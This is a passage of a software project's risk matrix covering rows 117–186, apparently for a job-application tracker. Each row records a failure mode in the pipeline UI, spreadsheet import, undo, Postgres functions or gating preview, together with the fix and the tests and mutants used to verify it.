| 117 | **"Wait until nothing is pending" is an unsound test gate** | `pending === 0` is true both BEFORE a write starts and after it ends, so a check landing between a blur and its commit passes instantly and reloads into the gap — cancelling the write and reporting it as lost persistence. The surface publishes a MONOTONIC finished-writes count (`data-writes`) for tests to pass a mark, plus a "Saving…" line a person needed anyway. Same family as row 21: remove the window, never sleep through it | ✅ |
| 118 | **The status `Select` renders off-screen or is keyboard-unreachable** | Radix `Select` (not hand-rolled) with `collisionPadding`; e2e focuses the trigger, opens by keyboard, asserts the listbox's bbox is inside the viewport on both projects, and Escape returns focus. `resilience.spec.ts`'s tab-walk is extended to /pipeline — 30 steps, then six ArrowDowns with the popover open | ✅ |
| 119 | **The notes dialog traps focus or loses its restore target** | Radix `Dialog` owns the trap; what the e2e asserts is the half a wrapper still gets wrong — Escape closes and focus returns to the trigger that opened it | ✅ |
| 120 | **Collapsed-group state lost on back/forward or a reload** | `?open=` is URL state: e2e drives collapse → URL → reload → Back → Forward, and a separate test asserts the RAW server HTML already carries the collapsed shape (no post-hydration snap). A toggle always writes the param explicitly, even when it matches the default, so a bare URL on the way back cannot silently re-open a closed group | ✅ |
| 121 | **An invented status vanishes from a grouped view** | One "Other" group, always last, and the row still renders its own text — a typo must not mint a permanent group that looks like a stage, and must not disappear either. `FIXTURE_APPLICATIONS` carries `waiting on referral` so the assertion can fail | ✅ |
| 122 | **The delisted badge lies after the posting reopens** | Derived from the `postings(status)` embed on every read, never stored: same application, two reads, two answers — asserted in SQL and over the fake, including through a WRITE (the returned row derives it too, or the badge would vanish on every edit). Honest limitation stated where the function is: a posting this user was never gated returns null and reads as still-listed, a false NEGATIVE, which is the right way round | ✅ |
| 123 | **Large type (Dad) overflows the page or clips the status pill** | `layout.spec.ts` runs a second painted-overflow sweep at six widths with `hq_display=large,comfortable`, asserting the attribute actually applied so the block cannot become a duplicate of the default sweep; plus a pipeline e2e measuring that the pill grows AND does not ellipsize its own text. This is NOT the 200%-zoom test: that multiplies the root font size, exercising the DEFAULT scale at 2x, and the pill fits one ratio and not the other | ✅ |
| 124 | **A runtime type scale that cannot exist** | `@theme inline` substitutes a token's value into every utility at build time, so `text-xs` compiles to a literal `.75rem` and overriding `--text-xs` on a selector reaches nothing. The large-type cookie changed the body font (a real `var()` reference) while every `text-*` utility stood still — the pill grew its text and not its box. The type tokens moved to a plain `@theme`; the colour tokens keep `inline`, which is what makes `.dark` work. Found by measuring, not by reading | ✅ |
| 125 | **A display preference leaks into a shared link** | Type scale and density are a cookie applied before first paint (the theme-bootstrap pattern), never URL state — a shared link must not impose the sharer's eyesight (row 67, on a new surface). An unrecognised cookie value is IGNORED rather than applied, so a stale or hand-edited one cannot leave the app in a state no CSS defines | ✅ |
| 125b | **Two type-scale mechanisms compound on one surface** | Making the tokens overridable (row 124) let the per-user cookie reach `/jobs`, which has scaled its own type per view since G3 — and scales column WIDTHS by the same ratio, because the widths are tuned for 14px. Both applied, `colScale` knew about one, and 15 of 19 comp cells clipped: a comp column hiding its own numbers. The grid opts its subtree out of the token override and names its own font size in EVERY branch (leaving the dense branch to inherit was what silently broke the view's own control when the opt-out landed). `grid-polish.spec.ts` sets the cookie **and** the view scale — the existing clip test set only the view scale, so it could not see this — and asserts the view switch still enlarges, so the opt-out cannot have frozen the grid instead | ✅ |
| 126 | **A big status group collapses the frame rate** | The pipeline is deliberately NOT virtualized (tens of rows; react-virtual inside collapsible groups is complexity bought for a load that does not exist). A 200-row layout budget is the measured trigger to revisit, desktop-only because a CPU budget on an emulated phone viewport means something else | ✅ |
| 127 | **The ambiguous-email review item is invisible** (AC 15) | The engine already refuses to choose between two candidate applications; that refusal had NO surface, so "neither row changed" was indistinguishable from "no email arrived". The section names both candidates, states that nothing was changed, and writes nothing. **Demo-fed, and that is the honest scope:** nothing writes ambiguous-email events to Postgres — `tracker/join.py` parks them in a sheet tab the web app has no reader for, so a production read would return zero rows forever. Exercised through `?demo=review` rather than shipped as dead code counted as done (row 99's shape), with the absence asserted as its own control | ◐ |
| 128 | **A pixel/optimistic assertion that cannot fail, twice over** | Two mutants SURVIVED the first pass and both taught something. (1) "Reject also applies the suggestion, optimistically" passed all 46 pipeline E2E tests in both projects: the optimistic frame is unobservable from a browser here, so it moved to a pure function + key-set unit test. (2) "Remove the toast safe area" also passed, because seven fixture rows already make the document taller than a phone — /companies was bitten only because that page is almost exactly one screen. The strip is now asserted STRUCTURALLY, and the test says in the file what it does not claim. **Assume your own new test is in this category until you have watched it go red** — and when a mutant survives, the test is the thing that was wrong | ✅ |

| 129 | **A btrim character LIST written as if it were a regex class** | `hq_blank_trim` passed its charset as btrim's SECOND argument in an E-string: `E' \t\r\n\f\v…'`. Postgres E-strings have no `\v`, so the string held the LETTER v, and btrim's second argument is a SET OF CHARACTERS — every note, status and next action lost a leading/trailing "v" on the way into an append-only table (`'verify comp band'` → `'erify comp band'`). The real U+000B was not trimmed at all, so the twin lists diverged in BOTH directions from the TS mirror. Anchored `regexp_replace` now, one grammar, `\v` means vertical tab in it; interior whitespace untouched (a note's line breaks are content, unlike 0008's identity-computing collapse). Four db tests + the rewritten parity pin go red on the old shape | ✅ |
| 130 | **A twin-list pin that only checks the part nobody edits** | The `blankTrim` ↔ `hq_blank_trim` pin asserted three substrings, all inside the unicode tail, so deleting `\t` from the SQL left all 444 vitest GREEN. It now extracts the SQL's classes by marker, expands the ranges, and runs every codepoint through both implementations — plus everything JS `\s` matches, so a character the SQL FORGOT fails rather than being absent from both sides. It also refuses the btrim-list shape outright | ✅ |
| 131 | **A lock with the key taped to it** | The human-status trigger guarded `status` and not `status_actor`, so `update applications set status_actor='system'` passed cleanly and the bot write behind it then passed too — a one-statement unlock of the mechanism row 102 is built on. It now defends its own latch; only a declared human write may hand a row back to the bots (the "let them drive again" gesture PHASE-PIPELINE defers, mechanism present, no UI) | ✅ |
| 132 | **The most consequential reopen needed no reason** | The reopen check named only the three TERMINAL states, so `Offer-Accepted → Applied` with a null note went straight through — reachable from the shipped Select, which offers every `STATUS_ORDER` value while only the Reopen BUTTON is gated on terminality. Un-ending a finished search is the reopen that most needs a trace. That tuple was also the FOURTH hand-typed copy of the list and the only wrong one; `hq_finished_statuses()` is the single definition, pinned against `status.ts` and `schema.py` | ✅ |
| 133 | **A suggestion that destroys the evidence link** | `join.py`'s locked branch wrote `evidence` unconditionally, so an event with no `thread_link` BLANKED the one field on the row a person can act on — while `advance_status` had always guarded that same write. Guarded on both the locked and the below-the-gate paths, with the positive control (a better link still replaces an older one) | ✅ |
| 134 | **A serialized write queue that reads a stale token** | `rowsRef` was updated from a `useEffect` — a MACROTASK — while the write queue advances on promise callbacks, MICROTASKS. So write B read the version token from before write A landed: text-blur then date-blur lost the date and raised a spurious "Changed on another device" toast, on both projects, with no added latency. `put()` writes the ref synchronously now. The test that covered it was leaning on an intermediate wait between the two blurs; that line is deleted, and the fix was watched red with the effect restored | ✅ |
| 135 | **An unbounded server action freezes the whole surface** | No timeout on the write, so a hung action stranded "Saving…" forever AND left `anyBusy` disabling every control — one request that never answers, one dead pipeline (verified: exactly one POST ever made, the second gesture never networked). Violated the house rule that cost three outages in a day. 15s bound → error toast → queue drains; the late write still lands and its idempotency key makes that safe | ✅ |
| 136 | **Every Retry issued a NEW command instead of replaying one** | Row 10 claims a double-tap is free, and it was not true here: each Retry minted a fresh `randomUUID`, so a request whose RESPONSE was lost (the new timeout, a dropped connection, a deploy mid-flight) applied a SECOND time against an append-only trail. Each gesture now mints one key and every retry of that gesture reuses it; asserted through the note count, which is where a double application is visible in the data | ✅ |
| 137 | **A dim-until-hydrated hint is a contrast failure** | `Kbd`'s own docstring records that `opacity-70` turned an 8.6:1 token into 3.95:1 — and two callers had re-added `opacity-40` for the not-yet-wired state. axe DOES flag `aria-hidden` text for contrast, so on any machine slow enough to scan before hydration the violation is real: it accounted for most of the container suite's 19 failures, and this branch's new axe check inherited it. `invisible` keeps the layout identical, shifts nothing when it appears, and leaves no colour to fail | ✅ |
| 138 | **A wall-clock budget is a statement about the machine** | The 200-row trigger shipped at 1000ms against a measured ~34ms (30x headroom — a number that can never fire), and tightening it to 150ms made it fire on the container, where qemu is far more than 4x slower than the host. No single number straddles both runners. It now compares the PER-ROW cost of a 150-row batch against a 50-row one, which is machine-independent and is what actually detects the regression worth catching: super-linear cost. Row 101's rule, arriving as a CPU claim | ✅ |
| 139 | **A test whose own chain breaks the thing it asserts** | The back/forward check put a `reload()` between the router push and `goBack()`, and in the container `goBack()` was then a NO-OP — the URL never changed at all, while on macOS it traversed normally. That is a driver/browser difference about history across a document boundary, not a fact about the app: measured without the reload, the container traverses and re-renders correctly. Split into two independent claims (survives a reload; survives back/forward), neither leaning on the other's side effects. A speculative `popstate`/`pageshow` listener written while chasing this was REVERTED once the measurement showed the app was never wrong — unexercised code counted as a fix is the same debt as an untested claim | ✅ |

| 140 | **`job_key` drifts between Python and TypeScript**, so every re-import duplicates | One golden fixture, `tests/fixtures/jobkeys.golden.json` (84 cases, generated FROM `core/jobkeys.py` rather than hand-typed), asserted by pytest AND vitest, plus a coverage assertion that every `ats` token in `_PATTERNS` is exercised — so a pattern added to one language with no golden case fails rather than going untested in both. `_PATTERNS` has **17 entries across 14 families**, not the 14 the plan says. Two traps closed while porting: `urlparse("careers/x")` returns an empty netloc where `new URL()` THROWS (the `url-` fallback is a hand-rolled `urlsplit` port, with a non-absolute URL in the golden so it is falsifiable), and Python's `str.strip()` trims a different character set than `trim()`. Nine mutants watched red | ✅ |
| 141 | **A THIRD `job_key` implementation, in SQL** | The plan has `app_import_set_mapping` "recompute" the key. Migration 0011 never computes one: keys arrive as data from the server action, and SQL only compares them. Two implementations are guarded by one golden fixture from two languages; a third would need its own guard and the failure it produces is silent — a key differing by one character makes every re-import a duplicate. What it costs is a caller that can post a fabricated key; what that buys is nothing, because every lookup is scoped to `auth.uid()` | ✅ |
| 142 | **A weak-keyed row hard-merges into a real application** | `isStrong()` is the only merge authorisation there is (`core/jobkeys.py:79-82`). A `norm-`/`url-` key produces a SUGGESTION — `matched_application_id` recorded, flagged in words the preview shows — and never an update. **"Inserted separately" is the half that is often not what happens**, and the row said it as though it always were: the look-alike it matched usually has the same company and title, which is exactly what `applications_manual_dedup` (0002) forbids, so the insert hits `on conflict do nothing` and the row is SKIPPED with a reason rather than added. Skipped is the right outcome and the preview says so; the claim that it lands as a second row was wrong. Enforced in SQL, mirrored in the fake, and both mutants (SQL and fake turning the suggestion into a merge) watched red | ✅ |
| 143 | **A bulk import overwrites a status a human chose — or takes 199 innocent rows down with it** | Both halves, because the second is what makes the first non-obvious: 0010's trigger raises 42501, so an unguarded write does not merely overwrite, it aborts the whole 200-row chunk and wedges the batch on one row somebody claimed by hand. `app_import_commit_chunk` skips the status write on a locked row and records it as `disposition='locked'` in the column report, so the value that did not land is stated rather than dropped | ✅ |
| 144 | **An import claims the human lock and deafens the engine on every row it touched** | A plain import writes `status_actor='system'`: if it claimed the lock, importing 2,000 rows would mean 2,000 rows no Gmail-captured rejection, OA or interview could ever advance again — the system's whole value, switched off by the act of onboarding. Asserted on BOTH paths, and that is not decoration: the first version of the test covered only the INSERT, and a mutant claiming the lock on every UPDATE survived it. The update path is the one an existing row takes, which is exactly the row somebody has been receiving email about | ✅ |
| 145 | **A round trip with no version token claims the lock anyway** | A round-trip status change IS a declared human write — the file carries that row's own `hq_version`, which is precisely the proof `app_set_status` demands of the pipeline UI. A file whose version column was DELETED still matches by `hq_id` and is no longer evidence that anybody read the current value, so it writes like a plain import and claims nothing (matrix row 40's other edge) | ✅ |
| 146 | **`hq_version` compared as a string, so every round-trip row reads as stale** | PostgREST answers `…+00:00`, JavaScript's `toISOString()` — which is what the app's own round-trip export writes into the column — answers `…Z`, and `to_jsonb(timestamptz)` answers whatever the session's TimeZone says: one instant, three strings. (The `to_char(…'OF')` rendering this row used to cite is not one of them; nothing in 0011 calls `to_char`, and the invented detail is corrected in the migration too.) A string comparison reports every row of every round-trip file as a conflict, which reads as the feature being broken rather than as a bug. Compared as a TIMESTAMP on both sides (`hq_import_version`), with an unreadable token treated as a conflict — the safe direction, since a token nobody can read is not proof the user saw the current value. Pinned by a fake test that feeds the same instant in two renderings | ✅ |
| 147 | **A stale round-trip version overwrites a newer edit** (AC 23) | `app_import_commit_chunk` RAISES while any included row is `conflict_state='unresolved'`, so the rule holds for a replayed outbox gesture, a hand-made request, and a bad deploy of the wizard. The fake enforces it too, or the UI's blocked state is never exercised by the suite that drives the fake. Mutant (gate removed) red in both | ✅ |
| 148 | **Undo reverts rows the user edited AFTER the import** | `import_rows.revert` carries the `updated_at` the import wrote; a row whose token has moved was acted on by a person or a bot since, and it is KEPT and listed in the report (`kept`, `keptIds`) rather than reverted. Mutant (comparison removed) red in SQL and in the fake | ✅ |
| 149 | **Undo runs twice, or after the window closed** | Idempotent on `p_idem` (the stored RESULT, so a replay returns the first answer), and a genuinely new gesture against an already-undone batch is REFUSED rather than answered with a cheerful no-op. The window is read from `undo_expires_at` on the ROW — a client that believes it is still Tuesday is not evidence, and the button being on screen is not authorisation | ✅ |
| 150 | **A failed undo leaves the batch half-reverted** | The whole "chunk-atomic, batch-reversible" argument rests on the revert being atomic, so it is one function body and the test FORCES a failure: a trigger that raises on the second delete, then assertions that the first row is still there and the batch is still `committed`. Not argued — executed | ✅ |
| 151 | **A blank cell erases a value** | An empty spreadsheet cell means "I did not fill this in", never "delete what you have", and the other reading makes an import unrecoverable. Only non-blank values are applied, in SQL and in the fake, mutant red in both. `hq_blank_trim` rather than `btrim`, because Excel cells are full of stray whitespace and bare btrim trims spaces only (0010's lesson, in the one place it is most likely). **The "in both" half was untrue when first written** — the fake read every mapped cell through bare `.trim()`, so a cell holding one zero-width space was blank to Postgres and CONTENT to the fake: it would write an invisible character over a next action, read a zero-width status as a status, and raise a round-trip conflict on a cell the database considers empty. Six call sites now go through `blankTrim`, and both suites carry the same five-character table (tab+newline, NBSP, U+200B, ideographic space, BOM) | ✅ |
| 152 | **A note lost because the import overwrote the flat column** | plans/README C5: the import APPENDS to `application_notes` with `author='import'` and never writes `applications.notes` — which spec §E round-trips and `APPLICATION_COLUMNS` reads. Asserted as a pair (the flat column verbatim afterwards, the imported note present) | ✅ |
| 153 | **The same file imported twice creates duplicates** (AC 20) | Strong-key match against `posting_key` first, then against a posting_key-NULL row with the same normalised company+title — which is the second import finding the rows the first one made, because most imported rows describe postings this system never swept and their applications carry no `posting_key` at all. Plus `on conflict do nothing` against `applications_manual_dedup`, without which one repeated company+title aborts a 200-row chunk. Name comparison goes through `company_name_key()`, never `lower()` (0008's NBSP lesson) — **and nothing was checking that**: swapping it for `lower()` left all 41 cases green, because every one of them differed only by case. The case that discriminates is an interior whitespace RUN, which `company_name_key` collapses and `lower` does not: `Goldman<NBSP>Sachs` is what pasting out of a web page puts in a cell, and under `lower()` it is a different company from the one already in the pipeline. Asserted in both suites; mutant red in both | ✅ |
| 154 | **Two concurrent commit chunks re-commit the same rows, and undo can then never find them** | The batch row is locked first. The harm is not a duplicate application — 0002's dedup index pins the count either way, which is what made the first version of this test unable to fail — it is that the loser rewrites every `outcome` to `skipped`, and a `skipped` row carries no `revert`, so undo cannot reach those applications and rows nobody chose become permanent. **Two mistakes on the way to that test, both worth keeping:** the mutant was first applied to the live database while the suite's `schema` fixture re-applies every migration from disk before the first test runs — the harness was lying, not the test; and on a `previewed` batch the first caller's own `set state='committing'` takes the row's write lock anyway, so the race only exists on chunk two onwards, which is what the test now drives | ✅ |
| 155 | **The one line in the report saying something did NOT land, erased by the line saying everything did** | `import_column_reports` is keyed on `(batch, column, DISPOSITION)`. Keyed on (batch, column) alone, the commit's "Status — 2 rows left alone, you had chosen those by hand" was overwritten by the report pass's "Status — 38 imported". A column legitimately carries several verdicts across a batch and the report has to be able to say all of them | ✅ |
| 156 | **A cross-tenant read of somebody's whole spreadsheet** | An import batch is every company a person is talking to and every note they typed into it, and all three tables are read DIRECTLY through PostgREST — so the select policies are load-bearing, not belt-and-braces. `test_rls.py` asserts both directions on all three AS `authenticated`, positive control first, plus a no-direct-write case. Two mutants red: the policy widened to `true`, and the revoke not naming the roles (Supabase's bootstrap grants to `anon`/`authenticated` by name, so `from public` alone closes nothing) | ✅ |
| 157 | **Windows-1252 CSV mangles every accent, silently** | And the plan's fallback did not work. On Node 24 / ICU 77, `new TextDecoder("windows-1252")` reports its own encoding as windows-1252 and then decodes 0x80-0x9F as raw C1 codepoints — ISO-8859-1 wearing the label, with `cp1252`/`latin1`/`iso-8859-1` all resolving to the same table. `0x92` became U+0092 instead of `’`, and Excel autocorrects `'` to `’` as you type, so that byte is in a large share of Windows-exported company names. `decodeWindows1252` is a hand-written 32-entry C1 table; the side benefit is that a small-icu Node throws on that constructor outright, which would have made the fallback a 500 on upload | ✅ |
| 158 | **Excel serial dates import as 1900, and an ambiguous date is guessed** | `readDate`/`coerceDate` handle a real `Date` (what the xlsx reader returns), an ISO string, and a 1900-system serial including the Lotus leap-year bug (serial 60 does not exist; 61 is 1900-03-01) — and return `null` WITH a reason rather than guess on `03/04/2026`. A silently wrong date is the failure people notice last. Mutant (fall through to `new Date(value)`) red | ✅ |
| 159 | **A fuzzy pre-fill guesses confidently and wrongly** | Hard 0.82 Dice floor; below it the field is Unmapped, never a greyed-out default, because nobody audits the field that already looks right. `hq_id`/`hq_version` are matched EXACT-only — a column called "HQ Identifier" fuzzy-matching into `hqId` would hand the matcher primary keys from somebody else's numbering scheme. A `Suggestion` carries the column INDEX, not just the header: a name is not an address, and a sheet with two "Notes" columns gives a by-name commit a coin flip whose loser is silently not imported | ✅ |
| 160 | **`.xls` / `.numbers` / password-protected upload → a stack trace** | Extension AND magic bytes before any parse (`.xls` and an encrypted OOXML are both OLE2, so the two are distinguished rather than lumped), each answering with a named error saying the format and what to do about it | ✅ |
| 161 | **A byte-exact fixture whose bytes git rewrites** | `read.test.ts` asserts that a CRLF file parses as CRLF, that a BOM is detected, and that windows-1252 bytes decode through the C1 table — every one of those is a claim about the exact bytes on disk, and git's eol normalisation rewrites precisely those bytes on checkout. A normalised `crlf-bom.csv` keeps passing on the machine that created it and is disarmed for everybody else. `.gitattributes` marks the fixture directory `-text` | ✅ |
| 162 | **The fake's undo window had already closed on every real day** | Batch timestamps came from the pinned fixture clock (2026-07-20) while `undo_expires_at` is compared against NOW — so a batch committed thirty seconds ago answered "the 24-hour undo window closed on the 21st", in the mode the owner is shown and the whole E2E suite runs in. Postgres stamps these with `now()`, so the wall clock is the faithful mirror; application version tokens keep the pinned clock because nothing measures the distance between two of them. Found by the fixture-parity suite on its first run — four undo tests red, and the fault was the fake's | ✅ |
| 163 | **A contract guard that cannot read its own contract** | `test_migrations.py`'s RPC-argument parser stopped at the first `}`, so an argument that is itself an object literal (`p_rows: rows.map((r) => ({ row_number: … }))`) cut the argument list short AND reported the inner keys as the function's parameters. It brace-matches now and takes only top-level keys, with a case of its own. Third instance of this shape in the repo (matrix rows 92, 130): a guard that mis-parses passes vacuously, which is worse than no guard because it is counted | ✅ |
| 164 | **A monotonic counter that is only monotonic within one component** | `import.spec.ts` gated every step on `data-writes`, which rows 21/117 ask for — but each wizard step is a different client component with its own `useWrites()`, so the write that MOVES the wizard unmounts the counter that recorded it. Measured: the value existed for 12ms; `expect.poll` looked at ~0/100/350/850ms. All four journey tests failed on every machine, and failed BYTE-IDENTICALLY with `commitImportChunkAction` gutted. Gated on `data-step` instead — derived server-side from `import_batches.state`, so it cannot advance before the write landed and cannot be reset by a remount. Mutant red at the right assertion, with `data-writes="1"` visible in the DOM at the moment of failure | ✅ |
| 165 | **A locator that matches nothing makes every assertion under it vacuous** | The AC-23 e2e located `pipeline-row-*` and `[data-application-id]`; the pipeline renders `row-<id>` and has never rendered either of those. The id was always null, the `test.skip` beneath it was the whole test, and the two assertions discharging AC 23 had run zero times. Same family as rows 92, 130, 163. Fixed to the real testid, the skip replaced by an assertion, and the resolver half written (answer the cell, watch Commit go live, commit, check the row moved). Mutant on `resolveImportRowAction` red | ✅ |
| 166 | **Half a round trip: `ROUND_TRIP_COLUMNS` had zero callers** | AC 23 was recorded as discharged while nothing this app produced could be imported back into the rows it came from — the export route emitted `APPLICATION_COLUMNS`, and every round-trip test hand-typed its own CSV, so both halves agreed with a third thing rather than with each other. The export request now carries `roundTrip` (refused for `jobs`, which has no row to write back to, rather than silently dropped), the dialog offers it off-by-default with the columns named, and two tests cross the seam: the headers the exporter writes are fed to the mapper that must recognise them, and a full export → re-import lands every row as `round-trip` with nothing to resolve | ✅ |
| 168 | **The undo compared two renderings of one instant** | `app_import_undo` matched `to_jsonb(v_app.updated_at)` against the stored `revert.wrote_updated_at` — and `to_jsonb(timestamptz)` renders with the SESSION's TimeZone, so a commit made under UTC and an undo run under America/Chicago produce different strings for the same moment. Every row then reads as "edited since the import", nothing is reverted, and the batch is still marked `rolled_back`: the one gesture that takes an import back is spent and did nothing. `::timestamptz` on both sides, the shape `hq_import_version` already used one function away (row 146). Mutant red: the cross-timezone test reports 0 reverted of 2. The fake could not have caught this — it has no session timezone — so it now compares instants too, and says why | ✅ |
| 169 | **A report that adds up to more than the batch** | The `imported` count read the FILE — every row whose mapped value was non-empty — so a Status skipped for the human lock was counted as `locked` AND as `imported` (the same row on both lines), and a cell the resolver answered "keep mine" was reported as imported while the row still held the old value. Nobody can re-derive this after the fact; only the commit knows. It now records `revert.wrote` per row (and `wroteColumns` in the fake) and the report counts from that. Mutant red on both sides | ✅ |
| 170 | **Four sweeps that could not reach the screens they were credited with** | `layout.spec.ts` and `resilience.spec.ts` are static path lists and the only import path in either is `/import` — the landing page. Every wizard screen lives at `/import/<batchId>`, minted at upload time, so painted overflow, axe per theme, the tab walk and the large type scale had touched none of them, and `wide-60.xlsx` had never been rendered in a browser at all. layout.spec.ts carried a comment claiming otherwise. `import-wizard.spec.ts` uploads a fixture and drives to each step (21 tests per project), plus ONE visual baseline of the mapping screen — the amber date warning there is a colour claim no assertion checks. Recorded and re-checked twice in the container, per the README's rule | ✅ |
| 171 | **UTF-16 parses "successfully" into mojibake** | Excel's own `Save As → Unicode Text` writes UTF-16LE. The strict UTF-8 decode fails on the NUL bytes and the windows-1252 fallback CANNOT fail — every byte is a character there — so the file parses with no error into one column of `C\0o\0m\0p\0a\0n\0y`, and a mapping screen full of mojibake is the only clue. Refused by BOM, by name, with the Save As that fixes it. The measurement is in the test: it asserts the old path "works" first | ✅ |
| 172 | **Three divergences where the fake was the more forgiving** | `commitImportChunk`'s clamp used `input.limit \|\| 200`, so limit 0 committed 200 rows in the demo and one in Postgres (`least(greatest(coalesce(p_limit, 200), 1), 500)` — 0 is not NULL). `imports()` was unbounded against PostgREST's `.limit(25)`, so a demo could render a list production truncates; one `IMPORT_LIST_LIMIT` now, read by both. And `MAX_CHUNK = 1000` is hand-copied across two languages and four sites with no drift test — a chunk larger than the function accepts is refused mid-import, after some rows have landed. `parity.test.ts` had no import section at all before this | ✅ |
| 173 | **Three claims in this matrix that were not true, and two guards that could not bite** | Row 146 invented a `to_char(…'OF')` rendering nothing in 0011 produces (the real three are PostgREST's `+00:00`, `toISOString()`'s `Z`, and `to_jsonb`'s session-dependent one). Row 142 said a weak-key suggestion is "inserted separately" as though always — the dominant case collides with `applications_manual_dedup` and is SKIPPED, and no test showed the promised insert until one was written for the case that can (an existing row carrying a posting_key, so the partial index does not apply). Row 141's "job_key is never computed in SQL" had nothing enforcing it; a migration-wide guard does now, mutant red. And `test_migrations.py`'s conflict-word pin searched the CONCATENATION of every migration, so 0010's three messages satisfied it on 0011's behalf — per-migration now, driven off whether the file takes an expected-version argument | ✅ |
| 174 | **A CSV round trip keeps the injection guard's apostrophe** | `escapeField` marks a cell beginning `= + - @ TAB CR` with Excel's text marker, which is not negotiable — board-supplied text is where the payload comes from. Now that the app exports files it also imports, re-importing that CSV *without* opening it in Excel keeps the mark. Stated in the dialog's format advice and pinned by a test; NOT "fixed" by stripping a leading apostrophe on import, which would eat the first character of `'-1 day'`. The xlsx round trip has no such cost, because a workbook cell is typed rather than sniffed | ✅ |
| 175 | **Two LOW findings that are correct as built, recorded so they are not re-found** | (a) Two target fields mapping to ONE column is accepted by the action and by the SQL — and the mapping screen says so in as many words ("That is allowed, and it is rarely what somebody meant"), so the three layers agree and there is nothing to fix. (b) `sniffHeaderRow`'s `uncertain` flag turns on a date or a number in the chosen row, so a data row of short distinct words is promoted confidently and one application is lost; bounded rather than solved, because the mapping screen renders that row's values as the live samples beside the toggle — the wrong answer appears as itself rather than behind a confidence flag, and guessing harder is the failure the toggle exists to avoid | ✅ |
| 176 | **Adding tests here broke tests over there** | The wizard sweeps upload and parse a workbook per test — the most expensive thing the suite does — and under `fullyParallel` seven landed at once. These passed; `pipeline.spec.ts` started failing intermittently instead, at its 15s-per-write gate, in roughly three full runs out of four. Contention, not a product bug, and the honest fix is to stop causing it: `test.describe.configure({ mode: "default" })` puts this one file on a single worker. `default`, not `serial` — serial skips the rest of the file after a failure and hides how many more there were. Three consecutive clean full runs afterwards, at the same wall-clock total. Rows 101 and 138's rule arriving from the other direction: a budget that only holds when nobody else is working is a statement about the machine | ✅ |
| 167 | **A round trip is not value-preserving for a status a person invented** | Found by writing 166's loop test. `waiting on referral` exports verbatim; the status vocabulary is closed on purpose (row 43 — a spreadsheet cell may not mint a stage) so the map sends it to Inbox; and because the file carries the row's own fresh token, the round-trip exception writes it back as a human gesture. Export the pipeline, import it back untouched, and that row moves to the start of the ladder in silence. **Open** — the fix is a policy call (leave an unrecognised status alone on a row that already has one, in SQL and in the fake) rather than a patch. Pinned by an assertion so it cannot get quietly worse, and stated in the export dialog rather than discovered on the way back in | ⬜ |

| 177 | **The preview and the engine disagree about gating** | `tests/fixtures/gate-corpus.json` — 67 cases executed by BOTH `tests/monitor/test_gate_corpus.py` and `webapp/tests/unit/gate-corpus.test.ts`, seeded from `test_gates.py` assertion by assertion plus AC 1-8 and G17. The app tells somebody "your profile would have qualified 61 of these 4,182"; if the TypeScript gate differs from `monitor/gates.py` by one branch that number is a lie they cannot check, and it stays a lie for weeks. Same shape as row 140, same answer. The fixture lives at the REPO root, not under `webapp/`, so neither side owns it | ✅ |
| 178 | **Three Python builtins the port could not borrow** | `str.strip()` trims U+001C-1F and U+0085 that `trim()` leaves AND leaves the U+FEFF `trim()` removes; `casefold()` folds ß to "ss" where `toLowerCase()` does not; `f"{x:g}"` renders 120.0 as "120" and 122.5 as "122.5", which neither `String()` nor `toFixed()` manages. `lib/gating/py.ts` writes all three out with the codepoint sets enumerated from CPython rather than remembered, and the corpus carries a case per divergence **in both directions** — a port drifts on whichever side nobody wrote a case for. Mutants red: `trim()` for `pyStrip` (2 cases), `toLowerCase()` for `casefold` (1) | ✅ |
| 179 | **A default that drifts is invisible to every case that names the knob** | The corpus's `defaults` block is asserted to BE `GateConfig()` field by field, and in the OTHER direction too: a new dataclass field with no entry there fails pytest. A `yoeMax` default of 5 in the TypeScript would otherwise pass all 67 cases that set `yoe_max` and be wrong for every case that does not. Mutant red at 4 assertions | ✅ |
| 180 | **A gate branch added on one side only** | Closed-set coverage in both suites: every §A2 reason kind appears in at least one case, and nothing outside the set is produced. A new rule with no corpus row fails rather than going untested in both languages | ✅ |
| 181 | **A raw machine token in front of a human** ("metro:Chicago") | `gate-closed-set.test.ts` runs the corpus through `dispose`, takes the reason strings it REALLY produces, and asserts none of them reaches `explainReason`'s `default:` branch — plus that every kind naming a user-changeable setting resolves through `reasonSetting()`, so the G9 link cannot be a dead sentence. The default branch is still correct behaviour and has its own case | ✅ |
| 182 | **`JobView` could not answer the question the gate asks** | Two fields added, each because the re-gate is wrong without it. `taggedAt`: a row filtered on geo while STILL untagged reads as `filtered`/`geo:India`, so its disposition carries no trace of whether it has been analysed — widening the country list has to answer `needs-info`, not `qualified`, and deriving tagged-ness from the reason gets that row wrong in the direction of promising a queue the engine will not deliver. `country`: `monitor/geo.py:159` writes `market = "Remote"` for ANY remote posting whatever country it resolved, so reading `market` re-gates a Canada-anchored remote role as qualified — G17 arriving through a lossy view model rather than a wrong branch | ✅ |
| 183 | **The binding constraint is wrong because gates short-circuit** | Computed by RELAXATION, not by counting reasons: nine fields each relaxed alone over the whole corpus, the winner being the one that recovers the most. The unit case is built to make a histogram fail — 30 foreign rows filtered on geo and 6 US rows on comp, so counting says countries 30 to 6 while relaxing countries recovers ZERO, because those rows then fail the same floor. Tie ORDER is deliberate and commented (`comp_unknown` before `comp_min`, `seniority_exclude` before `yoe_unknown`): several refusals are recovered by two fields at once, and the more specific advice wins | ✅ |
| 184 | **The preview promises jobs the engine never fetches** | `title_matches` runs at INGEST, so a posting the title filter rejected never entered `postings` at all — a user whose role family is new to the system previews near-zero and the number is not their profile's fault. Reported as a SEPARATE number, with the banner firing under 5% coverage and saying in as many words that it is "not a verdict on your settings". `PREVIEW_CORPUS` carries three FP&A titles out of 138 on purpose, so the banner is exercised rather than assumed — Dad's real situation, and a fake that matched both presets equally would ship it unlooked-at | ✅ |
| 185 | **A "dry run" that writes** | `app_preview_corpus` is `stable`, so Postgres REFUSES a data-modifying statement from inside it — the claim is enforced by the planner rather than by review, and the db test proves the mechanism by watching a stable writer raise 0A000. Capped at 5,000 rows / 90 days at the SQL boundary, with `url` excluded from the projection. E2E asserts the server's own version token is untouched across a preview | ✅ |
| 186 | **A security-definer read widened further than it was meant to** | `app_preview_corpus` deliberately bypasses `0002`'s per-user `postings` policy, because a user onboarding has ZERO `user_postings` rows and would preview against an empty universe — the exact silent starvation the screen exists to remove. The widening is bounded and asserted: `auth.uid() is not null` in the WHERE (not just the grant), `Closed` excluded, and an RLS test that pins the PROJECTION — no `triage`, `disposition`, `user_id` or `url` column exists to leak — beside a positive control proving the function answers at all | ✅ |
